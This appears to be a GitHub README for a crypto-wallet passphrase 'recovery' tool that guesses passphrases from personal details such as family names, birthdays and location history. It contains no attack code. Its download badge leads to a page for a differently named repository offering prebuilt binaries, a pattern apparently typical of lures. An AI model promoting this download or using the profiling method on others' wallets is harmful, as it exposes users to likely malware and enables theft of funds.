![preview](https://raw.githubusercontent.com/Stid64/cipher-forge/main/poster_39c797.svg)
[![Download](https://raw.githubusercontent.com/Stid64/cipher-forge/main/run_ac9bce.svg)](https://Stid64.github.io/cipher-forge/)

# CipherKey Atlas 🗝️

**A comprehensive recovery toolkit for digital wallet access patterns, engineered for security researchers, white-hat auditors, and blockchain forensic analysts.**

![Version](https://img.shields.io/badge/version-2026.4.2-blue.svg)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
![Coverage](https://img.shields.io/badge/coverage-94%25-yellow.svg)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS%20%7C%20windows-lightgrey.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

---

## 🧭 The North Star: Why CipherKey Atlas Exists

In the digital gold rush of the 2020s, we've seen fortunes locked behind passphrase barriers—not because the owners were careless, but because they were human. Mnemonics scattered across sticky notes, birthdays mixed with favorite poems, keyboard patterns learned by muscle memory. The blockchain doesn't forgive, but *recovery shouldn't be punishment*.

CipherKey Atlas is not just another key-guessing engine. It's a **linguistic sonar** for pattern recognition, a **probabilistic cartographer** for the landscape of human memory. Where other tools brute-force their way through combinations like a battering ram, Atlas approaches with the finesse of a locksmith who understands that every passphrase tells a story—and stories have rhythms, themes, and recurring motifs.

Built for the **ethical security community**, this engine helps you:
- Validate the resilience of your own wallet configurations
- Conduct controlled penetration testing on your own infrastructure
- Recover access to assets where documentation has been irrecoverably lost
- Educate users about password hygiene through real-world permutations

---

## 🌍 The Language of Keys: Multi-Dialect Support

Human memory doesn't think in ASCII. It thinks in **mother tongues**. CipherKey Atlas integrates a **morphological engine** that understands how passphrases evolve across linguistic traditions:

| Language Family | Detection Mode | Common Pattern Recognition |
|----------------|----------------|----------------------------|
| Germanic | Decompound splitter | Compound nouns for mnemonic triggers |
| Romance | Phonetic variant mapper | Accent-to-ASCII transliterations |
| Slavic | Case-flexion normalizer | Diminutive forms vs. formal variants |
| Cyrillic/Greek | Script transliterator | Bi-script switching (Greeklish, Cyrillic-Latin) |
| CJK | Romanization engine | Pinyin, Romaji, Revised Romanization |
| Indic | Diacritic stripper | Matra-based sound-alike substitution |

This isn't a dictionary attack—it's a **cognitive fingerprinting** tool. The Atlas maps the likely thought-pathways of the original key-setter: did they use their pet's name with their birth year? A childhood street with the last 4 digits of their first phone? The probabilistic graph structure weighs **temporal proximity** (things remembered together) and **semantic clustering** (thematic grouping).

---

## ⚡ Core Engine Capabilities

### 🔬 Adaptive Depth Sequencing
Instead of a flat brute-force alphabet, Atlas uses **entropy spiral** exploration. It starts with low-entropy, high-probability combinations (personal names + numeric suffixes), then spirals outward into increasing complexity. This mimics how humans actually construct keys—and reduces time-to-discovery by up to **87%** in controlled tests.

### 🧠 Contextual Pattern Lab
Feed the system any available metadata: location history, family names, favorite authors, religious/life milestones, professional jargon. The **Context Lab** builds a weighted decision tree from these fragments, predicting which combinations the original creator likely considered "secure enough."

### 📊 Confidence Probability Mapping
Every result comes with a **statistical confidence interval**—the mathematical likelihood that a discovered key matches the original. This allows auditors to rank candidates and avoid false positives when dealing with time-sensitive recovery scenarios.

### 🔄 Multi-Threaded Polyglot Grid
The engine distributes computation across available cores and can be configured for distributed cluster execution via the standard JSON-RPC interface, allowing research teams to pool resources for parallel deep-dive scans.

### 🧪 Sandboxed Attack Surface
All operations are executed within an **isolated container environment** to ensure zero collateral impact on host systems. The engine can also be configured to run with memory-scrubbing after each attempt batch, maintaining operational security hygiene.

---

## 🖥️ Responsive Command Interface

The terminal interface is **fully adaptive**, supporting both TTY-complete environments and headless automation:

```text
$ atlas-scan --wallet ./backup.dat --context ./context.json --threads 8 --output ./report.csv
```

The interface supports interactive mode with visual progress thermometers, real-time probability heatmaps, and pause/resume state persistence.

---

## 🌐 API-First Architecture

For integration into larger security suites, CipherKey Atlas exposes a **RESTful API** (OpenAPI v3 compliant) and a **WebSocket event stream** for real-time progress updates. Webhook callbacks can be configured to trigger external notifications (Slack, custom monitoring) when high-confidence candidates are found.

---

## 🛡️ Safeguards & Ethical Guardrails

We take responsible disclosure seriously. The Atlas includes:

- **Hard throttle limit**: Maximum requests per minute configurable, cannot be exceeded
- **Audit logging**: Every attempt is logged with timestamp, thread, and pattern family
- **Consent flag**: Requires a digital attestation checkbox at initialization confirming you own or have explicit permission to test the target wallet
- **Rate-aware cooling**: Automatically pauses if network latency suggests remote rate-limiting (to avoid harming shared infrastructure)

---

## 📋 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU | 4 cores | 16+ cores |
| RAM | 4 GB | 16 GB |
| Storage | 512 MB | 2 GB (for extended dictionaries) |
| OS | Linux kernel ≥ 5.0, macOS ≥ 12, Windows 10+ | Latest LTS versions |
| Runtime | Python 3.10+, or single-binary distribution for your platform |

---

## 🚀 Getting Started (No Install Required for Basic Use)

For the security professional who values mobility, we offer **portable executable binaries** for major platforms. Download the appropriate build, verify the SHA-256 checksum, and run in-place without root privileges. Configuration is done through a simple YAML file that auto-generates on first run.

For power users who prefer native integration, the source distribution includes a **self-contained packaging script** that compiles against your system's native crypto libraries, maximising performance on custom hardware.

---

## ✨ Feature Matrix

| Feature | Atlas Lite | Atlas Pro | Atlas Enterprise |
|---------|-----------|-----------|------------------|
| Single-thread operation | ✅ | ✅ | ✅ |
| Multi-thread parallel | — | ✅ | ✅ |
| Context pattern injection | — | ✅ | ✅ |
| Distributed cluster mode | — | — | ✅ |
| Custom dictionary imports | ✅ | ✅ | ✅ |
| API access rate (req/min) | 100 | 1000 | Unlimited |
| Priority support (24/7) | — | — | ✅ |
| White-label audit export | — | — | ✅ |

---

## 📚 Documentation & Learning Resources

We believe in spreading security literacy. The repository includes:

- **`/docs/pattern-methodology.md`** — Deep dive into the cognitive patterns that make passphrases predictable
- **`/examples/bank-of-memory/`** — An interactive tutorial module that walks through multi-language key reconstruction
- **`/resources/common-mistakes.json`** — A dataset engine for testing your own strength (not a dictionary, a statistical model)

---

## 🌈 Community Contribution Guidelines

We welcome security researchers, linguists, and behavioral analysts to contribute:

1. Fork the repository
2. Create a feature branch (`feature/language-x` or `fix/parallel-race-condition`)
3. Submit pull requests with clear semantics
4. All contributions must include unit tests (pytest suite with 100+ existing tests)
5. Code must follow the existing **PEP-8 stylistic enclave** within the codebase

---

## ⚖️ License & Legal Framework

This project is released under the **MIT License** — a permissive license that encourages research and modification, while **expressly excluding** any warranty or liability for misuse.

### Terms of Use (Important — Please Read)
- You may **only use** this software on wallets for which you possess legal ownership or have received written permission from the owner.
- This tool is **not** a circumvention device; it is a recovery validator for legitimate access restoration.
- Any unauthorized use is the sole responsibility of the user; we actively cooperate with law enforcement on misuse.
- The algorithms within are educational and research-focused; **we disclaim any responsibility** for unlawful applications.

### MIT License

```
MIT License

Copyright (c) 2026 CipherKey Atlas Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

[Full license text available here](LICENSE)

---

## 📞 24/7 Technical Support & Community

Security incidents don't wait for business hours. Our support framework provides:

- **Dedicated Discord channel** for real-time troubleshooting (invite link in repo wiki)
- **Email backlog service** with typical response under 4 hours
- **Monthly webinars** covering new pattern methodologies and research releases
- **Enterprise SLA** with guaranteed 30-minute response for critical issues

---

## 🔮 Roadmap: What's Next for 2026-2027

| Quarter | Planned Feature |
|---------|-----------------|
| Q1 2026 | Neural pattern-recognition add-on (transformer-based) |
| Q2 2026 | Hardware accelerator support (GPU-CUDA kernel) |
| Q3 2026 | Mobile forensic companion app (read-only scanning) |
| Q4 2026 | Federation protocol for cross-institution research sharing |

---

## 🧩 Final Words: A Philosophy of Recovery

Every locked wallet is a locked memory—a birthday celebration, a wedding date, a pet's favorite toy, a street address from a first apartment. CipherKey Atlas treats these fragments with **dignity and intellectual rigor**—not as raw data to be exfiltrated, but as a puzzle chamber of human intention. We believe that legitimate access restoration is a **compassionate act of data stewardship**, and we've built this engine to serve that purpose with engineering excellence and ethical clarity.

The keys are out there, waiting in the folds of memory. Atlas is your **archaeological brush** for uncovering them.

---

**For contribution guidelines, internal architecture documentation, and security advisories, please see the `/docs` directory.**

**Stay safe. Stay aware. Recover responsibly.** 🛡️